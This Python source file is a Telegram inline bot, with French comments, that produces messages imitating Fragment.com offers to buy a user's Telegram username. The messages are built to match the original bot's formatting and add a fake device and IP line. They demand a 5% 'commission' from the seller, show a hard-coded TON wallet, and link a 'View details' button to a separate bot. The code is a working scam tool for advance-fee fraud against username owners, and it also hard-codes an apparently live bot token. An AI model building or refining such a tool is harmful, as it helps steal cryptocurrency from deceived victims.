import os
import time
import urllib.request
import json
import asyncio
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import threading
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, MessageEntity, InlineQueryResultArticle, InputTextMessageContent
from telegram.ext import Application, InlineQueryHandler, ContextTypes

# Configuration
BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
PORT = int(os.getenv('PORT', 10000))
WEBHOOK_URL = "https://telegram-bot-vic3.onrender.com"

print(f"🤖 Inline Fragment Deal Generator v4.7")
print(f"🔑 Token: ✅")
print(f"🌐 Port: {PORT}")
print(f"🔗 Webhook: {WEBHOOK_URL}")

# Variables globales
app = None
event_loop = None

def get_ton_price():
    """Récupère le prix du TON en temps réel"""
    try:
        url = "https://api.coingecko.com/api/v3/simple/price?ids=the-open-network&vs_currencies=usd"
        with urllib.request.urlopen(url, timeout=10) as response:
            data = json.loads(response.read().decode())
            price = float(data['the-open-network']['usd'])
            print(f"💰 Prix TON récupéré: ${price:.4f}")
            return price
    except Exception as e:
        print(f"❌ Erreur API CoinGecko: {e}")
        try:
            url = "https://api.diadata.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000"
            with urllib.request.urlopen(url, timeout=5) as response:
                data = json.loads(response.read().decode())
                price = float(data.get('Price', 5.50))
                print(f"💰 Prix TON (fallback): ${price:.4f}")
                return price
        except Exception as e2:
            print(f"❌ Erreur API DIA: {e2}")
            return 5.50

def generate_fragment_message(username, ton_amount):
    """Génère le message Fragment avec formatage identique au bot original"""
    ton_price = get_ton_price()
    price = float(ton_amount)
    price_usd = price * ton_price
    commission = price * 0.05
    commission_usd = commission * ton_price
    wallet_address = "UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR"

    fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:

• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
• Commission: 💎{commission:g} (${commission_usd:.2f} USD)

Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.

Additional Information:
• Device: Safari on macOS
• IP Address: 103.56.72.245
• Wallet: {wallet_address}

Important:
• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
• If you choose not to proceed, simply ignore this message."""

    entities = [
        MessageEntity(MessageEntity.BOLD, fragment_message.find(f"• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)"), len(f"• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)")),
        MessageEntity(MessageEntity.BOLD, fragment_message.find(f"• Commission: 💎{commission:g} (${commission_usd:.2f} USD)"), len(f"• Commission: 💎{commission:g} (${commission_usd:.2f} USD)")),
        MessageEntity(MessageEntity.BOLD, fragment_message.find("• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible."), len("• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.")),
        MessageEntity(MessageEntity.BOLD, fragment_message.find("• If you choose not to proceed, simply ignore this message."), len("• If you choose not to proceed, simply ignore this message.")),
        MessageEntity(MessageEntity.TEXT_LINK, fragment_message.find(wallet_address), len(wallet_address), url=f"https://tonviewer.com/{wallet_address}")
    ]

    button_url = f"https://t.me/BidRequestApp_bot/?startapp={username.lower()}-{price:g}"
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("View details", url=button_url, disable_web_page_preview=True)]
    ])

    return fragment_message, entities, keyboard

async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gestionnaire des requêtes inline"""
    try:
        query = update.inline_query.query.strip()

        # Vérification basique de la requête
        if not query:
            return await update.inline_query.answer([], cache_time=1, is_personal=True)

        parts = query.split()
        if len(parts) < 2:
            return await update.inline_query.answer([], cache_time=1, is_personal=True)

        username = parts[0].replace('@', '')

        try:
            ton_amount = float(parts[1])
            if ton_amount <= 0:
                return await update.inline_query.answer([], cache_time=1, is_personal=True)
        except ValueError:
            return await update.inline_query.answer([], cache_time=1, is_personal=True)

        fragment_message, entities, keyboard = generate_fragment_message(username, ton_amount)
        current_ton_price = get_ton_price()
        current_usd_value = ton_amount * current_ton_price

        result = InlineQueryResultArticle(
            id=str(time.time()),
            title=f"Fragment Deal: @{username}",
            description=f"💎 {ton_amount:g} TON (${current_usd_value:.2f})",
            input_message_content=InputTextMessageContent(
                fragment_message,
                entities=entities,
                disable_web_page_preview=True
            ),
            reply_markup=keyboard
        )

        await update.inline_query.answer([result], cache_time=1, is_personal=True)
        print(f"✅ Réponse inline envoyée: {username} - {ton_amount} TON")

    except Exception as e:
        print(f"❌ Erreur dans inline_query_handler: {e}")
        await update.inline_query.answer([], cache_time=1, is_personal=True)

class WebhookHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        global app, event_loop
        try:
            if self.path != f'/{BOT_TOKEN}':
                self.send_response(404)
                return

            content_length = int(self.headers.get('content-length', 0))
            post_data = self.rfile.read(content_length)
            update_data = json.loads(post_data.decode('utf-8'))

            if app and event_loop:
                asyncio.run_coroutine_threadsafe(
                    process_update(update_data),
                    event_loop
                )

            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"ok":true}')

        except Exception as e:
            print(f"❌ Erreur webhook: {e}")
            self.send_response(500)
            self.end_headers()

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(f"Bot is running. Port: {PORT}".encode('utf-8'))

async def process_update(update_data):
    global app
    try:
        if app:
            update = Update.de_json(update_data, app.bot)
            await app.process_update(update)
    except Exception as e:
        print(f"❌ Erreur traitement update: {e}")

def run_webhook_server():
    server = HTTPServer(('0.0.0.0', PORT), WebhookHandler)
    print(f"🌐 Serveur webhook démarré sur le port {PORT}")
    server.serve_forever()

async def setup_bot():
    global app, event_loop
    try:
        app = Application.builder().token(BOT_TOKEN).build()
        app.add_handler(InlineQueryHandler(inline_query_handler))
        await app.initialize()
        await app.start()

        webhook_url = f"{WEBHOOK_URL}/{BOT_TOKEN}"
        await app.bot.set_webhook(url=webhook_url)
        print(f"✅ Webhook configuré: {webhook_url}")

        event_loop = asyncio.get_event_loop()
        threading.Thread(target=run_webhook_server, daemon=True).start()

        while True:
            await asyncio.sleep(1)

    except Exception as e:
        print(f"❌ Erreur setup bot: {e}")
        raise

def main():
    try:
        print("🚀 Démarrage du bot...")
        asyncio.run(setup_bot())
    except KeyboardInterrupt:
        print("🛑 Arrêt du bot...")
    except Exception as e:
        print(f"❌ Erreur critique: {e}")

if __name__ == '__main__':
    main()
